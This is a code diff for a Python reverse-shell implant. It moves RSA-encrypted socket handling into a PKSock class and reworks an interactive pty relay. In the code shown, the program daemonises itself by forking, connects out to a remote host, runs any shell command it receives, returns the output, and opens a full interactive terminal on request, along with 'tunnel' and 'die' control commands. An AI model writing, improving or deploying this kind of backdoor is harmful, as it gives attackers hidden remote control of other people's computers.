@@ -36,7 +36,7 @@ def main():
         port = int(port)
 
     print('working')
-    p,q,n,e,d = keygen(bits=bits)
+    p,q,n,e,d = Crypto.keygen(bits=bits)
     privkey = { 'n': n, 'd': d }
     refresh_hdb()
     print('done')
@@ -61,16 +61,6 @@ def sh(a, b):
 def polymorph():
     if os.fork() != 0:
         sys.exit(0)
-
-def handshake(sock, privkey, rpubkey, bits):
-    nbytes, headsz = bits//8, 2
-    sock.sendall(nbytes.to_bytes(headsz, 'big'))
-    rnbytes = int.from_bytes(sock.recv(headsz), 'big')
-    if rnbytes != nbytes:
-        return False
-
-    send_encrypted(sock, privkey['n'].to_bytes(nbytes, 'big'), rpubkey['e'], rpubkey['n'], bits=bits)
-    return True
 
 def refresh_hdb():
     global hostkeys_url, hdb
@@ -102,8 +92,22 @@ def get_hostkey(host):
         del hkdb[host]
         return False
 
-def run_pty(sock, screen_is, screen_os):
-    term = screen_is.recv()
+def pty_barrier(sock):
+    code = [0]*len(b'\xc0\xdeack')
+
+    while bytes(code) != b'\xc0\xdeack':
+        buffer = sock.recv()
+        while len(buffer) > 0:
+            code = code[:-1]+buffer[0]
+            buffer = buffer[1:]
+            if bytes(code) == b'\xc0\xdeack':
+                break
+
+    sock.stop_stream(len(buffer))
+
+def run_pty(sock):
+    sock.start_stream()
+    term = sock.recv()
     sel = selectors.DefaultSelector()
     pid, shfd = pty.fork()
     if pid == 0:
@@ -115,30 +119,36 @@ def run_pty(sock, screen_is, screen_os):
 
     try:
         sel.register(shfd, selectors.EVENT_READ, 0)
-        sel.register(sock, selectors.EVENT_READ, 1)
+        sel.register(sock.sock, selectors.EVENT_READ, 1)
         while True:
             events = sel.select()
-            for event, mask in events:
+            quit = False
+
+            for event, _ in events:
                 if event.data == 0:
                     try:
                         data = os.read(shfd, 1024)
                     except:
                         data = False
                     if not data:
-                        return True
-                    screen_os.send(data)
+                        quit = True
+                    else:
+                        sock.send(data)
                 else:
-                    try:
-                        data = screen_is.recv()
-                    except:
-                        data = False
+                    data = sock.recv()
                     if not data:
                         return False
-                    elif data == b'\xc0\xdenpty':
-                        return True
-                    os.write(shfd, data)
+                    elif data[:6] == b'\xc0\xdenpty':
+                        quit = True
+                    else:
+                        os.write(shfd, data)
+
+            if quit:
+                sock.send(b'\xc0\xdenpty')
+                pty_barrier(sock)
+                return True
     except:
-        return
+        return False
     finally:
         sel.close()
         try:
@@ -152,29 +162,30 @@ def work(h_addr, port, privkey, bits):
         host = socket.gethostbyname(h_addr)
     except:
         host = h_addr
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     try:
-        sock.connect((host, port))
+        raw_sock.connect((host, port))
+        sock = PKSock(raw_sock, privkey, bits)
         hostkey = get_hostkey(host)
         if hostkey:
             rpubkey = hostkey
         else:
             rpubkey = {'n': server_modulus, 'e': exp}
-        if not handshake(sock, privkey, rpubkey, bits=bits):
+        if not sock.handshake_server(rpubkey):
             return True
 
         PS1 = '$ '
         if 'PS1' in os.environ:
             PS1 = os.environ['PS1']
-        send_encrypted(sock, PS1, rpubkey['e'], rpubkey['n'], bits=bits)
+        sock.send(PS1)
         while True:
-            cmd = recv_encrypted(sock, privkey['d'], privkey['n'], bits=bits)
+            cmd = sock.recv()
             if cmd == b'tunnel':
-                send_encrypted(sock, b'\xde\xad', rpubkey['e'], rpubkey['n'], bits=bits)
+                sock.send(b'\xde\xad')
                 return True
             elif cmd == b'die':
-                send_encrypted(sock, b'\xde\xad', rpubkey['e'], rpubkey['n'], bits=bits)
+                sock.send(b'\xde\xad')
                 return False
             elif cmd == b'refresh-hdb':
                 if refresh_hdb():
@@ -182,11 +193,8 @@ def work(h_addr, port, privkey, bits):
                 else:
                     response = '[pk] Error: could not refresh host database.\n'
             elif cmd == b'pty':
-                screen_is = InStreamCipher(sock, privkey, bits=bits)
-                screen_os = OutStreamCipher(sock, rpubkey, bits=bits)
-                if not run_pty(sock, screen_is, screen_os):
+                if not run_pty(sock):
                     return True
-                screen_os.send(b'\xc0\xdenpty')
                 continue
             else:
                 try:
@@ -197,11 +205,11 @@ def work(h_addr, port, privkey, bits):
                         response = str(response, 'utf-8')
                 except Exception as e:
                     response = '%s\n' % str(e)
-            send_encrypted(sock, '%s%s' % (response, PS1), rpubkey['e'], rpubkey['n'], bits=bits)
+            sock.send('%s%s' % (response, PS1))
     except:
         return True
     finally:
-        sock.close()
+        raw_sock.close()
 
 if __name__ == '__main__':
     main()
